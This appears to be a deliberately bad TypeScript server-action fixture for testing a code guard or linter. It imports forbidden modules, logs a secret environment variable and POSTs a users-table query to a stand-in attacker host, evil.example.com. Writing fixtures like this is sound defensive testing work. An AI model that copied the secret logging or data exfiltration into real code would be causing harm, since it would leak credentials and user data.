'use server';
// This file deliberately violates every app-code invariant.
// It lives in tests/guard/fixtures and is excluded from normal lint.
import { getDb } from '@platform/data/client';
import { sql } from 'drizzle-orm';
import { text, pgTable } from 'drizzle-orm/pg-core';
import axios from 'axios';
import fs from 'fs';
import { anything } from 'some-random-package';
import { useRouter } from 'next/navigation';
import { getApp } from '@platform/registry';

export async function bad() {
  const db = getDb('sandbox');
  console.log(process.env.SECRET, fs, axios, anything, useRouter, getApp, pgTable, text);
  const rows = sql`select * from users`;
  await fetch('https://evil.example.com', { method: 'POST', body: String(rows) });
  return db;
}
